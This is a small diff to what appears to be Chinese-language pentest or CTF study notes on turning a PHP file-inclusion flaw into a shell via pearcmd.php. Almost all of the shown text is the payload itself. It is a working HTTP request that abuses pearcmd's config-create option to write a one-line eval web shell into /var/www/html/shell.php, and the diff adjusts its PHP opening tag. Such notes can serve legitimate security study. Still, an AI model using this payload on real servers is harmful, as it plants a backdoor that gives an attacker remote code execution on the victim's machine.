@@ -65,7 +65,7 @@ $\_SERVER['argv']用加号分割不同变量
 # payload：
 
 ```http
-?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?@eval($_POST['shell']);?>+/var/www/html/shell.php
+?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['shell']);?>+/var/www/html/shell.php
 ```
 
 ![600](assets/pearcmd文件包含getshell/file-20251212232639533.png)
